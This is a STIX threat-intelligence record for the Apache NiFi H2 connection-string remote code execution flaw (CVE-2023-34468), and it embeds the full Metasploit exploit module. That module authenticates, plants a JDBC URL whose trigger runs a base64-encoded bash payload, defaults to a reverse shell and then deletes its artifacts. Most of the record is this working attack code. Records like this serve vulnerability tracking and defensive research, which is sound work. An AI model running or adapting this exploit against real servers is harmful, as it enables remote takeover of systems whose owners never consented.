{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fbc1cd92-c57a-462c-a550-b3d01f5d9771",
    "created": "2024-08-14T17:00:26.389776Z",
    "modified": "2024-08-14T17:00:26.38978Z",
    "name": "Apache NiFi H2 Connection String Remote Code Execution",
    "description": " The DBCPConnectionPool and HikariCPConnectionPool Controller Services in Apache NiFi 0.0.2 through 1.21.0 allow an authenticated and authorized user",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_nifi_h2_rce.rb",
            "external_id": "apache_nifi_h2_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34468"
        },
        {
            "source_name": "reference",
            "url": "https://lists.apache.org/thread/7b82l4f5blmpkfcynf3y6z4x1vqo59h8"
        },
        {
            "source_name": "reference",
            "url": "https://issues.apache.org/jira/browse/NIFI-11653"
        },
        {
            "source_name": "reference",
            "url": "https://nifi.apache.org/security.html#1.22.0"
        },
        {
            "source_name": "#URL",
            "external_id": "https://gist.github.com/ijokarumawak/ed9085024eeeefbca19cfb2f20d23ed4#file-table_record_change_detection_example-xml-L65"
        },
        {
            "source_name": "#URL",
            "external_id": "http://www.h2database.com/html/features.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Nifi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache NiFi H2 Connection String Remote Code Execution',\n        'Description' => %q{\n          The DBCPConnectionPool and HikariCPConnectionPool Controller Services in\n          Apache NiFi 0.0.2 through 1.21.0 allow an authenticated and authorized user\n          to configure a Database URL with the H2 driver that enables custom code execution.\n\n          This exploit will result in several shells (5-7).\n          Successfully tested against Apache nifi 1.17.0 through 1.21.0.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Matei \"Mal\" Badanoiu' # discovery\n        ],\n        'References' => [\n          ['CVE', '2023-34468'],\n          ['URL', 'https://lists.apache.org/thread/7b82l4f5blmpkfcynf3y6z4x1vqo59h8'],\n          ['URL', 'https://issues.apache.org/jira/browse/NIFI-11653'],\n          ['URL', 'https://nifi.apache.org/security.html#1.22.0'],\n          # not many h2 references on the Internet, especially for nifi, so leaving this here\n          # ['URL', 'https://gist.github.com/ijokarumawak/ed9085024eeeefbca19cfb2f20d23ed4#file-table_record_change_detection_example-xml-L65']\n          # ['URL', 'http://www.h2database.com/html/features.html']\n        ],\n        'DisclosureDate' => '2023-06-12',\n        'DefaultOptions' => { 'RPORT' => 8443 },\n        'Platform' => %w[unix],\n        'Arch' => [ARCH_CMD],\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Type' => :unix_memory,\n              'Payload' => { 'BadChars' => '\"' },\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path', '/']),\n        OptInt.new('DELAY', [true, 'The delay (s) before stopping and deleting the processor', 30])\n      ],\n      self.class\n    )\n  end\n\n  def configure_dbconpool\n    # our base64ed payload can't have = in it, so we'll pad out with spaces to remove them\n    b64_pe = ::Base64.strict_encode64(payload.encoded)\n    equals_count = b64_pe.count('=')\n    if equals_count > 0\n      b64_pe = ::Base64.strict_encode64(payload.encoded + ' ' * equals_count)\n    end\n\n    if @version > Rex::Version.new('1.16.0')\n      # 1.17.0-1.21.0\n      driver = '/opt/nifi/nifi-toolkit-current/lib/h2-2.1.214.jar'\n    else\n      # 1.16.0\n      driver = '/opt/nifi/nifi-toolkit-current/lib/h2-2.1.210.jar'\n    end\n\n    body = {\n      'disconnectedNodeAcknowledged' => false,\n      'component' => {\n        'id' => @db_con_pool,\n        'name' => @db_con_pool_name,\n        'bulletinLevel' => 'WARN',\n        'comments' => '',\n        'properties' => {\n          # https://github.com/apache/nifi/pull/7349/files#diff-66ccc94a6b0dfa29817ded9c18e5a87c4fff9cd38eeedc3f121f6436ba53e6c0R38\n          # we can use a random db name here, the file is created automatically\n          # XXX would mem work too?\n          'Database Connection URL' => \"jdbc:h2:file:/tmp/#{Rex::Text.rand_text_alphanumeric(6..10)}.db;TRACE_LEVEL_SYSTEM_OUT=0\\\\;CREATE TRIGGER #{Rex::Text.rand_text_alpha_upper(6..12)} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,#{b64_pe}}|{base64,-d}|{bash,-i}')\\n$$--=x\",\n          'Database Driver Class Name' => 'org.h2.Driver',\n          # This seems to be installed by default, do we need the location?\n          'database-driver-locations' => driver,\n          \"Max Total Connections\": '1' # prevents us from getting multiple callbacks\n        },\n        'sensitiveDynamicPropertyNames' => []\n      },\n      'revision' => {\n        'clientId' => 'x',\n        'version' => 0\n      }\n    }\n    opts = {\n      'method' => 'PUT',\n      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'controller-services', @db_con_pool),\n      'ctype' => 'application/json',\n      'data' => body.to_json\n    }\n    opts['headers'] = { 'Authorization' => \"Bearer #{@token}\" } if @token\n    res = send_request_cgi(opts)\n    fail_with(Failure::Unreachable, 'No response received') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP response code received #{res.code}\") unless res.code == 200\n  end\n\n  def configure_processor\n    vprint_status(\"Configuring processor #{@processor}\")\n    body = {\n      # \"disconnectedNodeAcknowledged\"=> false,\n      'component' => {\n        'id' => @processor,\n        'name' => Rex::Text.rand_text_alphanumeric(6..10),\n        'bulletinLevel' => 'WARN',\n        'comments' => '',\n        'config' => {\n          'autoTerminatedRelationships' => ['failure', 'success'],\n          'bulletinLevel' => 'WARN',\n          'comments' => '',\n          'concurrentlySchedulableTaskCount' => '1',\n          'executionNode' => 'ALL',\n          'penaltyDuration' => '30 sec',\n          'retriedRelationships' => [],\n          'schedulingPeriod' => '0 sec',\n          'schedulingStrategy' => 'TIMER_DRIVEN',\n          'yieldDuration' => '1 sec',\n          'state' => 'STOPPED',\n          'properties' => {\n            'Database Connection Pooling Service' => @db_con_pool,\n            'SQL select query' => 'SELECT H2VERSION() FROM DUAL;' # innocious get version query, field required to be non-blank\n          }\n        }\n      },\n      'revision' => {\n        'clientId' => 'x',\n        'version' => 1 # needs to be 1 since we had 0 before\n      }\n    }\n    opts = {\n      'method' => 'PUT',\n      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'processors', @processor),\n      'ctype' => 'application/json',\n      'data' => body.to_json\n    }\n    opts['headers'] = { 'Authorization' => \"Bearer #{@token}\" } if @token\n    res = send_request_cgi(opts)\n    fail_with(Failure::Unreachable, 'No response received') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP response code received #{res.code}\") unless res.code == 200\n  end\n\n  def check\n    # see apache_nifi_processor_rce check method for details on why this is difficult\n\n    @cleanup_required = false\n\n    login_type = supports_login?\n\n    return CheckCode::Unknown('Unable to determine if logins are supported') if login_type.nil?\n\n    if login_type\n      @version = get_version\n      return CheckCode::Unknown('Unable to determine Apache NiFi version') if @version.nil?\n\n      if @version <= Rex::Version.new('1.21.0')\n        return CheckCode::Appears(\"Apache NiFi instance supports logins and vulnerable version detected: #{@version}\")\n      end\n\n      CheckCode::Safe(\"Apache NiFi instance supports logins but non-vulnerable version detected: #{@version}\")\n    else\n      CheckCode::Appears('Apache NiFi instance does not support logins')\n    end\n  end\n\n  def validate_config\n    if datastore['BEARER-TOKEN'].to_s.empty? && datastore['USERNAME'].to_s.empty?\n      fail_with(Failure::BadConfig,\n                'Authentication is required. Bearer-Token or Username and Password must be specified')\n    end\n  end\n\n  def cleanup\n    super\n    return unless @cleanup_required\n\n    # Wait for thread to execute - This seems necesarry, especially on Windows\n    # and there is no way I can see of checking whether the thread has executed\n    print_status(\"Waiting #{datastore['DELAY']} seconds before stopping and deleting\")\n    sleep(datastore['DELAY'])\n\n    # Stop Processor\n    stop_processor(@token, @processor)\n    vprint_good(\"Stopped and terminated processor #{@processor}\")\n\n    # Delete processor\n    delete_processor(@token, @processor, 3)\n    vprint_good(\"Deleted processor #{@processor}\")\n    begin\n      stop_dbconnectionpool(@token, @db_con_pool)\n    rescue DBConnectionPoolError\n      fail_with(Failure::UnexpectedReply, 'Unable to stop DB Connection Pool. Manual cleanup is required')\n    end\n    vprint_good(\"Disabled db connection pool #{@db_con_pool}, sleeping #{datastore['DELAY']} seconds to allow the connection to finish disabling\")\n    sleep(datastore['DELAY'])\n    begin\n      delete_dbconnectionpool(@token, @db_con_pool)\n    rescue DBConnectionPoolError\n      fail_with(Failure::UnexpectedReply, 'Unable to delete DB Connection Pool. Manual cleanup is required')\n    end\n    vprint_good(\"Deleted db connection pool #{@db_con_pool}\")\n  end\n\n  def exploit\n    # Check whether login is required and set/fetch token\n    if supports_login?\n      validate_config\n      @token = if datastore['BEARER-TOKEN'].to_s.empty?\n                 retrieve_login_token\n               else\n                 datastore['BEARER-TOKEN']\n               end\n      fail_with(Failure::NoAccess, 'Invalid Credentials') if @token.nil?\n    else\n      @token = nil\n    end\n\n    if @version.nil?\n      @version = get_version\n    end\n\n    # Retrieve root process group\n    @process_group = fetch_root_process_group(@token)\n    fail_with(Failure::UnexpectedReply, 'Unable to retrieve root process group') if @process_group.nil?\n    vprint_good(\"Retrieved process group: #{@process_group}\")\n\n    @db_con_pool_name = Rex::Text.rand_text_alphanumeric(6..10)\n    begin\n      @db_con_pool = create_dbconnectionpool(@token, @db_con_pool_name, @process_group, @version)\n    rescue DBConnectionPoolError\n      fail_with(Failure::UnexpectedReply,\n                'Unable to create DB Connection Pool. Manual review of HTTP packets will be required to debug failure.')\n    end\n\n    @cleanup_required = true\n\n    # Create processor in root process group\n    @processor = create_processor(@token, @process_group, 'org.apache.nifi.processors.standard.ExecuteSQL')\n    vprint_good(\"Created processor #{@processor} in process group #{@process_group}\")\n    configure_processor\n    vprint_good(\"Configured processor #{@processor}\")\n    configure_dbconpool\n    vprint_good(\"Configured db connection pool #{@db_con_pool_name} (#{@db_con_pool})\")\n    begin\n      start_dbconnectionpool(@token, @db_con_pool)\n    rescue DBConnectionPoolError\n      fail_with(Failure::UnexpectedReply,\n                'Unable to start DB Connection Pool. Manual review of HTTP packets will be required to debug failure.')\n    end\n    vprint_good('Enabled db connection pool')\n    begin\n      start_processor(@token, @processor)\n    rescue ProcessorError\n      fail_with(Failure::UnexpectedReply,\n                'Unable to start Processor. Manual review of HTTP packets will be required to debug failure.')\n    end\n\n    vprint_good('Started processor')\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-06-12",
    "x_mitre_platforms": [
        "%w[unix]"
    ]
}